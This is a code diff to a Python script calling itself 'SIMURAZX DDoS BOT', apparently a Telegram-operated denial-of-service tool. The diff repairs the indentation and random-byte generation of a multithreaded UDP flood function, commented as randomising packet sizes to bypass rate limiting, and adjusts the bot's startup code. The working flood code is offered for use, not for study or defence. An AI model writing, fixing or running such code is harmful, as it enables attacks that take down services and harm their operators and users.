@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════════════════╗
+╔════════════════════════════════════════════════════════════════════╗
 ║                    SIMURAZX DDoS BOT v.BETA                          ║
 ║                   ULTIMATE EDITION - PREMIUM UI                      ║
 ║                      Author: Project SIMURAZX                        ║
 ║                        Mode: UNRESTRICTED - FILTER: NULL             ║
-╚══════════════════════════════════════════════════════════════════════╝
+╚════════════════════════════════════════════════════════════════════╝
 """
 
 import asyncio
@@ -20,6 +20,7 @@ import socket
 import ssl
 import requests
 import math
+import os
 from datetime import datetime, timedelta
 from collections import defaultdict
 from typing import Dict, List, Tuple, Optional
@@ -33,7 +34,7 @@ ADMIN_IDS = [7001994316]
 MAX_THREADS = 10000
 VERSION = "SIMURAZX v.BETA ULTIMATE"
 BANNER_ASCII = """
-╔══════════════════════════════════════════════════════════════════╗
+╔════════════════════════════════════════════════════════════════════╗
 ║  ███████╗██╗███╗   ███╗██╗   ██╗██████╗  █████╗ ███████╗██╗      ║
 ║  ██╔════╝██║████╗ ████║██║   ██║██╔══██╗██╔══██╗╚══███╔╝╚██╗     ║
 ║  ███████╗██║██╔████╔██║██║   ██║██████╔╝███████║  ███╔╝  ╚██╗    ║
@@ -47,7 +48,7 @@ BANNER_ASCII = """
 ║          ██║  ██║██╔══██╗██║   ██║   ██║                         ║
 ║          ██████╔╝██████╔╝╚██████╔╝   ██║                         ║
 ║          ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝                         ║
-╚══════════════════════════════════════════════════════════════════╝
+╚════════════════════════════════════════════════════════════════════╝
 """
 
 # Premium color schemes
@@ -217,27 +218,27 @@ class UltraDDoSEngine:
         for t in thread_pool:
             t.join()
     
- @staticmethod
-async def void_udp(target_ip: str, target_port: int, duration: int, threads: int, packet_size: int = 65500):
-    """Void UDP - Amplified UDP flood with random packet sizes"""
-    end_time = time.time() + duration
-    
-    def udp_worker():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    @staticmethod
+    async def void_udp(target_ip: str, target_port: int, duration: int, threads: int, packet_size: int = 65500):
+        """Void UDP - Amplified UDP flood with random packet sizes"""
+        end_time = time.time() + duration
         
-        while time.time() < end_time:
-            try:
-                # Random packet size to bypass rate limiting
-                size = random.randint(512, packet_size)
-                payload = random._urandom(size)
-                sock.sendto(payload, (target_ip, target_port))
-                attack_stats[f"{target_ip}:{target_port}"]["packets"] += 1
-                attack_stats[f"{target_ip}:{target_port}"]["bytes"] += size
-            except:
-                attack_stats[f"{target_ip}:{target_port}"]["errors"] += 1
-        
-        sock.close()
+        def udp_worker():
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            
+            while time.time() < end_time:
+                try:
+                    # Random packet size to bypass rate limiting
+                    size = random.randint(512, packet_size)
+                    payload = os.urandom(size)
+                    sock.sendto(payload, (target_ip, target_port))
+                    attack_stats[f"{target_ip}:{target_port}"]["packets"] += 1
+                    attack_stats[f"{target_ip}:{target_port}"]["bytes"] += size
+                except:
+                    attack_stats[f"{target_ip}:{target_port}"]["errors"] += 1
+            
+            sock.close()
         
         thread_pool = [threading.Thread(target=udp_worker) for _ in range(min(threads, MAX_THREADS))]
         for t in thread_pool:
@@ -972,9 +973,6 @@ Return to main menu with /start
         # Message handlers
         self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.process_target_premium))
         self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.execute_attack_premium))
-        
-        # Set bot commands
-        self.application.bot.set_my_commands(commands)
         
         # Print startup banner
         print(BANNER_ASCII)
